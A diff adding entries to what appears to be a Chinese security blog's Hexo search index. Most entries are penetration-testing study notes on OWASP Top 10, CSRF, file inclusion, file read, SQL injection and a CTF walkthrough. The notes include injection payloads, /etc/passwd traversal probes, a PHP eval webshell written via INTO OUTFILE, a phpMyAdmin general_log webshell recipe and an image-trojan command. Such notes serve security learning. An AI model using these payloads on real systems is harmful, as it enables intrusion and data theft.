@@ -1,8 +1,147 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[OWASP TOP10]]></title>
+    <url>%2F2019%2F09%2F09%2FOWASP-TOP10%2F</url>
+    <content type="text"><![CDATA[注入注入漏洞,包括SQL,NoSQL,OS,LDAP注入等,这些攻击发生在当不可信的数据作为命令或查询语句的一部分,被发送给解释器的时候.攻击者发送的恶意数据可以欺骗解释器,以执行计划外额命令或未被恰当授权时访问数据. 失效的身份认证和会话管理与认证和会话管理相关的应用函数经常被错误的应用,这就允许攻击者窃取密码,密钥,会话token,或者利用其他的应用错误来暂时或者永久地获取用户身份信息 敏感信息泄露许多web应用和API不能合理的保护敏感数据,比如金融,医疗数据和PII.攻击者可能窃取或篡改这些弱保护的数据进行信用卡诈骗,身份窃取或者其他犯罪.敏感数据需要额外的保护,比如在存在和传输过程中的加密,在浏览器进行交换时也需要特殊的预防措施. 外部处理器漏洞(XXE)许多过时的或者配置不当的XML处理器在XML文档内进行外部实体引用.外部实体可以被用来泄露内部文件,比如使用文件URL handler,内部文件共享,内部端口扫描,远程代码执行和拒绝服务攻击. 无效的访问控制仅允许认证的用户的限制没有得到恰当的强制执行.攻击者可以利用这些权限来访问未经授权的功能和数据,例如访问其他用户的账户,参看敏感文件,修改其他用户的数据,更改访问权限等. 错误的安全配置安全配置错误时常见的问题,这是不安全的默认配置,不完整或者ad hoc望楼配置,开放云储存,错误配置的HTTP头,含有敏感信息的冗长错误信息造成的.除了要安全设定所有的操作系统,框架,库,应用外,还要及时进行系统更新和升级. 跨站脚本攻击当应用程序在新网页中包含不受信任的数据而无需正确的验证或转义时,或使用可以创建HTML或者JavaScript的浏览器API并使用用户提供的数据更新现有网页就会发生XSS缺陷.XSS允许攻击者在受害者的浏览器上执行脚本,从而劫持用户会话,危害网站,或者将用户转向恶意网站. 不安全的反序列化不安全的反序列化漏洞经常导致远程代码执行.即使反序列化错误不导致远程代码执行,也可以被用于发起攻击,例如重放攻击,注入攻击和权限提升攻击等 使用含有已知的漏洞的组件组件,比如库,框架和其他软件模块,是与应用相同权限运行的.如果一个有漏洞的组件被利用,这种攻击可以造成更为严重的数据丢失或服务器接管.使用已知漏洞组件的应用和API可能会破坏应用程序的防御系统,并使一系列可能的攻击和影响成为可能. 不完善的日志记录和监控记录和监控不足,加上没有与应急响应有效的结合,让攻击者可以进一步攻击系统,篡改,提权或者销毁数据.大多数的数据泄露研究显示,通常要经过200天以上,使用者才能察觉到数据泄露时间的发生,而且往往是外部机构而不是内部监控系统发现数据泄露的事实.]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>OWASP-TOP10</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[Hello World]]></title>
     <url>%2F2019%2F09%2F09%2Fhello-world%2F</url>
     <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
+  </entry>
+  <entry>
+    <title><![CDATA[CSRF漏洞]]></title>
+    <url>%2F2019%2F09%2F08%2FCSRF%E6%BC%8F%E6%B4%9E%2F</url>
+    <content type="text"><![CDATA[CSRF漏洞的概述 CSRF(Cross-Site Request Forgery,跨站请求伪造) 是一种挟制用户在当前已登录的Web应用程序上执行非 本意的操作的攻击方法, 攻击者盗用了你在某个网站的身份，以你的名义发送恶意请求。 CSRF漏洞的原理 被攻击的两个前提: 1.登陆信任网站A, 并在本地生成Cookie 2.在不退出的情况下, 访问危险网站B 如不满足上述任意条件,就不会受到CSRF攻击让用户执行非本意的操作挟持用户某些html标签是可以发送HTTP GET类型的请求的。例如 &lt;img src=”http://www.baidu.com&quot;&gt;浏览器渲染img标签的时候, 并不知道img标签中的src属性值到底是不是一个图片. 浏览器只是根据src中的链接, 发起一个HTTP GET请求, 并携带上当前浏览器在目标网站上的凭证, 也就是cookie, 获取返回结果以图片的形式渲染. CSRF漏洞的分类与利用 GET CSRF CSRF最初的一个错误观点, 认为只能有GET请求发起, 因此一些开发者认为只要把重哎哟的操作改为POST请求就可以防止CSRF PHP中 $_REQUEST 既可以接收POST也可以接收GET请求 POST CSRF 如果服务端已经分了GET和POST请求, 只用$_POST来接收请求数据: 就最简单的方法就是在攻击页面构造一个form表单, 然后用javascript自动提交这个表单 CSRF漏洞的挖掘与防御 使用token 验证码 验证referer]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>CSRF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[文件查看与下载]]></title>
+    <url>%2F2019%2F08%2F19%2F%E6%96%87%E4%BB%B6%E6%9F%A5%E7%9C%8B%E4%B8%8E%E4%B8%8B%E8%BD%BD%2F</url>
+    <content type="text"><![CDATA[背景 一些网站的业务需求，可能提供文件查看或下载的功能，如果对用户 查看或下载的文件不做限制，就能够查看或下载任意的文件，可以是源 代码文件、敏感文件等等。 成因 不管是任意文件读取还是任意文件下载，触发的漏洞条件都是相同的 存在读取文件的函数 读取文件的路径用户可控且未校验或校验不严 输出了文件内容 漏洞危害 下载服务器任意文件，包含脚本代码文件 、系统敏感文件等。可以 配合其它类型的漏洞。可以进一步代码审计，查找更多可利用的代码。 漏洞分类 任意文件读取 &lt;?php $filename=”test.txt”;readfile($filename);?&gt; &lt;?php $filename=”test.txt”;echo file_get_contens($filename);?&gt; &lt;?php $filename=”test.txt”; $fp=fopen($filename,”r”)or die(“Unable to open file!”); $data=fread($fp,1024); fclose($fp); echo $data;?&gt; $filename=$_GET[f]; $filename没有经过校验,或者校验不合格,用户可以控制这个变量读取任意文件,比如/etc/passwd,index.php等等. 任意文件下载 &lt;?php if(empty($_GET[‘filename’])){ exit(); } $filename=$_GET[‘filename’]; header(“Content-Type:application/octet-stream”); header(“Accept-Length:”.filesize($filename)); header(“ Content-Disposition:attachment;filename=”.$filename ); readfile($filename); ?&gt; 在上述代码中: $filename=”uploads/20170206.jpg”; $filename一般是用户需要下载的文件 $filename$_GET[f]; $filename没有经验校验,或者校验不合格,用户可以控制这个变量下载任意文件,比如/etc/passwd 漏洞挖掘 Web漏洞扫描器(AWVS,AppScan,Openvas,Nessus) 手动从链接 readfile.php?file=xxx.txt download.php?file=xxx.rar 参数名查看 &amp;readpath,&amp;filepath,&amp;path,&amp;inputfile,&amp;url,&amp;data,&amp;readfile,&amp;menu,META-INF,WEB-INF 漏洞验证 index.php?f=../../../../../etc/passwd index.php?f=../index.php index.php?f=file:///etc/passwd 当参数f值为php文件时: 若文件被解析则是文件包含漏洞 若显示源码,则是文件查看漏洞 提示下载则是文件下载漏洞 漏洞修复方案 过滤 . 点,使用户在url中不能回溯上级目录 正则严格判断用户输入的参数 php.ini配置open_basedir限制文件访问范围]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>PHP</tag>
+        <tag>文件查看</tag>
+        <tag>文件下载</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[文件包含漏洞]]></title>
+    <url>%2F2019%2F08%2F19%2F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%2F</url>
+    <content type="text"><![CDATA[常见文件包含函数 include() //遇错警告 include_once() require() //遇错停止 require_once() @include:包含的文件不存在,程序会继续执行 @require:包含文件不存在,程序停止执行 文件包含漏洞原理 文件包含漏洞产生的原因是在通过引入文件时,引用的文件名,用户可控,由于传入的文件名没有经过合理的校验,或者校验被绕过 常见漏洞代码if(isset($_GET[‘page’])){ include $_GET[‘page’];}else{ include “one.php”;} 文件包含漏洞危害 配合文件上传漏洞GetShell 可以执行任意脚本代码 网站源码以及配置文件泄露 远程包含GetShell 控制整个网站,甚至是服务器 文件包含漏洞分类 当被包含的文件在服务器本地时,就形成了本地文件包含漏洞 远程文件包含原理和本地文件包含同理 当php.ini中配置选项allow_url_fopen和allow_url_include 为 On 的话,则存在远程文件包含 %00 截断 需要magic_quotes_gpc=off PHP版本要小于5.3.4 路径长度截断 Windows文件名长于256Linux文件名长于4096 伪协议 读网站源码文件 index.php?page=php://filter/read=convert.base64-encode/resource=index.php @ 直接包含木马文件，可以是图片，txt,压缩包…. ?page=php://input接收POST请求,需要开启allow_url_include ?page=http://192.168.14.80/www/1.txt &gt; [phpinfo()]需要开启allow_url_fopen 和 allow_url_include (远程包含) ?page=data://text/plain,需要开启allow_url_fopen 和 allow_url_include 包含日志文件Getshell 首先要找到日志文件存放位置 php.ini的配置选项allow_url_fopen 和 allow_url_include为on 远程服务器上存放一个txt文件 , 或者不被解析的php文件 因为包含的时候返回的是php源代码，所以不能被解析 修复方法 PHP中使用open_basedir配置限制访问在指定的区域 过滤 .（点）/（反斜杠）\（反斜杠） 禁止服务器远程文件包含 (allow_url_fopen , allow_url_include , off)]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>PHP</tag>
+        <tag>文件包含</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[SQL注入]]></title>
+    <url>%2F2019%2F08%2F16%2FSQL%E6%B3%A8%E5%85%A5%2F</url>
+    <content type="text"><![CDATA[SQL注入 and 1=1 / and 1=2 回显页面不同（整形判断） 单引号判断 ‘ 显示数据库错误信息或者页面回显不同（整形，字符串类型判断） \ (转义符) -1/+1 回显下一个或上一个页面（整型判断） and sleep(5) UNION query SQL injection（可联合查询注入） 前提:页面上有显示位,缺点亦是页面上必须有显示位 优点:方便,快捷,易于利用 判断列数 : order by 4 (数值取到最大,页面显示正常,下一步判断显示位) 判断显示位 : php?id=-1 union select 1,2,3,4 //id=-1 让第一行无法正常显示,显示出显示位 http://www.asfaa.org/members.php?id=-3 union select 1,database(),3,group_concat(table_name) from information_schema.tables where table_schema=database() //爆出当前库所有表名 Error-based SQL injection（报错型注入） 页面上没有显示位,但是需要输出SQL语句执行错误信息( 比如:mysqli_error() ) 优点不需要显示位 通过floor报错 floor 通过 and extractvalue(1,payload) 报错 http://127.0.0.1/st/day02/baji/vul/user/show_error.php?id=1 and extractvalue(1,concat(0x27,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) //爆出所有表名 通过 and updatexml(1,payload,1)报错 与extractvalue(1,payload)相同 Boolean-based blind SQL injection（布尔型注入） 优点 : 不需要显示位,不需要报错信息 只能通过页面返回正常与否判断 , 速度慢 , 花费大量时间 常用的几个函数 : substr(‘user’,1,1) = u ascii(‘u’) =117 http://127.0.0.1/st/day02/baji/vul/user/show.php?id=1&#39; and 1 –+ //and 1 页面显示正常 http://127.0.0.1/st/day02/baji/vul/user/show.php?id=1&#39; and 0 –+ //and 0 页面无显示 http://127.0.0.1/st/day02/baji/vul/user/show.php?id=1&#39; and length(database())=4 –+ 当length(database())=4时页面显示正常,证明数据库名是4个字符组成 http://127.0.0.1/st/day02/baji/vul/user/show.php?id=1&#39; and substr(database(),1,1)=’b’ –+ and substr(database(),1,1)=’b’ 页面显示正常 , 证明当前数据库名的第一个字符为 ‘b’ 因为当substr(database(),1,1)=’b’成立时等价于1,后续更改substr()函数的参数及可获取完整数据库名,表名,列名操作相同 Time-based blind SQL injection（基于时间延迟注入） 不需要显示位,不需要出错信息 速度慢 , 耗费大量时间 原理与bool注入相同 if(条件,1,2)函数 : 当条件为真时返回1,为假时返回2 http://127.0.0.1/st/day02/baji/vul/user/show.php?id=1&#39; and if(length(database())=4,sleep(4),1) –+ 当length(database())=4为真时 , 就等待4秒 Mysql注释 #(url编码为%23) – (–后面要跟上一个或多个空格:可用+号代替空格–+) /*…*/ /*!…*/ 内联注释 select * /*!222from*/ user; Mysql常用函数(配合select使用) user() 当前登录数据库的用户 database() 当前数据库 @@version 数据库版本 session_user() @@basedir 数据库安装路径 @@datadir 数据存放路径 @@version_complie_os 服务器操作系统 load_file() 读文件 知道文件绝对路径 能够使用union查询 对web目录有写入权限 UNION SELECT 1,load_file(‘/etc/passwd’),3,4,5,6 –+ UNION SELECT 1,load_file(0x2f6574632f706173737764),3,4,5,6 –+ into outfile() 写文件操作 必须用绝对路径 用户必须有写入文件的权限 没有对’号过滤 SELECT ‘&lt;?php @eval($_POST[‘qwer’]);?&gt;‘ into outfile ‘c:\Windows\tmp\1.php’ concat(str1,str2) 连接字符串 str1str2 concat_ws(‘拼接分离的字符串’,str1,str2) -&gt; str1拼接分离的字符串str2 group_concat(select username from user) -&gt; username1,username2]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+        <tag>Mysql</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[phpmyadmin通过日志文件拿webshell]]></title>
+    <url>%2F2019%2F08%2F12%2Fphpmyadmin%E9%80%9A%E8%BF%87%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E6%8B%BFwebshell%2F</url>
+    <content type="text"><![CDATA[前提: root用户 思路: general log设置为ON 利用mysql的一个日志文件 这个日志文件每执行一个sql语句就会将其执行的保存 将这个日志文件修改为.php文件保存 然后执行一条一句话的sql语句 使用菜刀连接即可 三句话 set global general_log=’on’; SET global general_log_file=’C:/webshell/www/cmd.php’; SELECT ‘&lt;?php @eval($_POST[‘cmd’]);?&gt;‘;]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>phpmyadmin</tag>
+        <tag>Webshell</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[图片马制作]]></title>
+    <url>%2F2019%2F08%2F12%2F%E5%9B%BE%E7%89%87%E9%A9%AC%E5%88%B6%E4%BD%9C%2F</url>
+    <content type="text"><![CDATA[copy xx.jpg /b + xx.txt /a = shell.jpg/b 二进位文件(不破原文件)/a ASCII 文本文件]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>木马</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[form表单]]></title>
+    <url>%2F2019%2F08%2F09%2Fform%E8%A1%A8%E5%8D%95%2F</url>
+    <content type="text"><![CDATA[&lt;form action=”index.html” method=”post”&gt; 文本&lt;input type=”text” placeholder=”请输入用户名” name=”username”/&gt; 密码&lt;input type=”password” placeholder=”请输入密码” name=”password”/&gt; 单选框性别:&lt;input type=”radio” name=”sex” checked=”checked”/&gt;男&lt;input type=”radio” name=”sex”/&gt;女 name要一致 复选框爱好:&lt;input type=”checkbox” name=”c” id=”c”/&gt;唱歌&lt;input type=”checkbox” name=”t” id=”t” checked=”checked”/&gt;跳舞&lt;input type=”checkbox” name=”r” id=”r” checked=”checked”/&gt;rap checked=”checked” 默认勾选 按钮&lt;input type=”reset” value=”重置” /&gt;&lt;input type=”submit” value=”提交” /&gt; 隐藏域&lt;input type=”hidden” name=”hidden” value=”qwer” /&gt; 文件上传&lt;input type=”file” name=”headimg” formenctype=”multipart/form-data” /&gt;&lt;/form&gt;]]></content>
+      <categories>
+        <category>编程语言</category>
+      </categories>
+      <tags>
+        <tag>HTML</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[CTF简单的SQL注入思路]]></title>
+    <url>%2F2019%2F07%2F12%2FCTF%E7%AE%80%E5%8D%95%E7%9A%84SQL%E6%B3%A8%E5%85%A5%E6%80%9D%E8%B7%AF%2F</url>
+    <content type="text"><![CDATA[id=1后面加’,返回报错；加and 1=1，返回正常；加and 1=2，返回报错； 存在注入点。 order by猜字段，order by 1，返回正常；order by 2，返回正常；order by 3，返回错误；猜出字段为2。 查数据库，and 1=2 union select 1,database()，数据库为‘my_db’。 查版本，and 1=2 union select 1,version()，版本为5.5.47。 查表,and 1=2 union select 1, table_name from information_schema.tables,查到名‘thiskey’的表。 查列，and 1=2 union select 1, column_name from information_schema.columns where table_schema=’my_db’ and table_name=’thiskey’,里面就一个数据‘k0y’。 and 1=2 union select 1,k0y from thiskey，成功获取key 链接: http://ctf5.shiyanbar.com/8/index.php?id=1]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[JS常量变量]]></title>
+    <url>%2F2019%2F07%2F04%2FJS%E5%B8%B8%E9%87%8F%E5%8F%98%E9%87%8F%2F</url>
+    <content type="text"><![CDATA[常量定义方法 const 常量名 = 值 示例 const PI=3.1415926; PS:常量是程序有运行中不可改变的量 变量定义方法 var 变量名 = 值 示例 var name = 123 变量是程序中可运行的变量 输出 console.log(“haha”) console.log(name) 类型转换 var num = 123 -&gt; typeof num= Number str = String(num) -&gt; typeof str = string Number转换 var i = “123qwe” type Number(i) 返回Number类型console.log(Number(i)) 返回Nan(非数字值的特殊值) parseInt类型转换 只取整数i = “123qwe1230” console.log(parseInt(i)) 输出123,中间有字符同理(包括小数点) i = “qwe123” console.log(parseInt(i)) //Nan parseFloat类型转换 只取小数同理parseInt,忽略第一个小数点 Boolean 为真返回true 为假返回false (非0,非空即为真) Null为空 i=0 -&gt; console.log(Bootlean(i)) -&gt; 返回false 凡是被引号包括的字符串都默认为字符型,引号无法解析变量名(PHP中双引号可以解析变量)]]></content>
+      <categories>
+        <category>编程语言</category>
+      </categories>
+      <tags>
+        <tag>JavaScript</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[SSH服务 容许root登陆]]></title>
+    <url>%2F2019%2F06%2F15%2FSSH%E6%9C%8D%E5%8A%A1-%E5%AE%B9%E8%AE%B8root%E7%99%BB%E9%99%86%2F</url>
+    <content type="text"><![CDATA[查看ssh服务状态 #/etc/init.d/ssh status 修改配置文件 vim /etc/ssh/sshd_config #PermitRootLogin prohibit-password改为: PermitRootLogin yes #PasswordAuthentication yes改为: PasswordAuthentication yes 启动ssh服务 /etc/init.d/ssh start 查看服务状态 /etc/init.d/ssh status 开机启动 #update-rc.d ssh enable]]></content>
+      <categories>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>SSH</tag>
+        <tag>Kali</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Test]]></title>
+    <url>%2F2019%2F01%2F01%2FTest%2F</url>
+    <content type="text"><![CDATA[Test]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>Test</tag>
+      </tags>
   </entry>
 </search>
